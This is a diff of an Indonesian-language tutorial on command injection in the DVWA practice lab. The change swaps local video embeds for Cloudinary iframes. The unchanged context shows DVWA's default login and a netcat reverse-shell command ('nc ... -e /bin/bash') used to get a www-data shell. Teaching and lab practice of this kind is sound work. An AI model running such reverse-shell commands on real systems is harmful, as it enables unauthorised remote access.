@@ -11,11 +11,15 @@ Sesuai dengan namanya, ***Command Injection*** adalah kerentanan pada aplikasi w
 
 Untuk membuktikan, kita mula-mula akan melihat demonstrasinya command injection terlebih dahulu melalui DVWA yang sudah kita *install* dan *set up* di artikel sebelumnya. Setelah login ke DVWA dengan credensial default, <mark> **admin:password**</mark>, pergi ke menu **Command Injection**. Di sana, ada *form* **`ping`** dan kita bisa meng-*input*-kan *ip address* untuk di-**`ping`**. Kita bisa coba dengan memasukkan *ip address* komputer kita dan nanti *output* **`ping`**-nya akan tampil di bawah *form* tersebut.
 
-<div style="display: flex; justify-content: center;">
-  <video width="80%" controls autoplay loop muted>
-    <source src="../images/commandinjection/vid1.mp4" type="video/mp4">
-  </video>
-</div>
+<iframe
+  src="https://player.cloudinary.com/embed/?cloud_name=dpvtbnqf7&public_id=commandinjection1_pzgzqw"
+  width="640"
+  height="360" 
+  style="height: auto; width: 100%; aspect-ratio: 640 / 360;"
+  allow="autoplay; fullscreen; encrypted-media; picture-in-picture"
+  allowfullscreen
+  frameborder="0"
+></iframe>
 
 Sekarang, kita akan lihat *source code* yang ada di belakangnya, berikut:
 
@@ -112,11 +116,15 @@ nc 192.168.0.109 1234 -e /bin/bash
 > 
 > Untuk info lebih lanjut, bisa baca-baca di **`man nc`**.
 
-<div style="display: flex; justify-content: center;">
-  <video width="100%" controls autoplay loop muted>
-    <source src="../images/commandinjection/vid2.mp4" type="video/mp4">
-  </video>
-</div>
+<iframe
+  src="https://player.cloudinary.com/embed/?cloud_name=dpvtbnqf7&public_id=commandinjection2_oxdvlq"
+  width="640"
+  height="360" 
+  style="height: auto; width: 100%; aspect-ratio: 640 / 360;"
+  allow="autoplay; fullscreen; encrypted-media; picture-in-picture"
+  allowfullscreen
+  frameborder="0"
+></iframe>
 
 Dan kita berhasil mendapatkan *shell* server-nya sebagai user **www-data**.
 
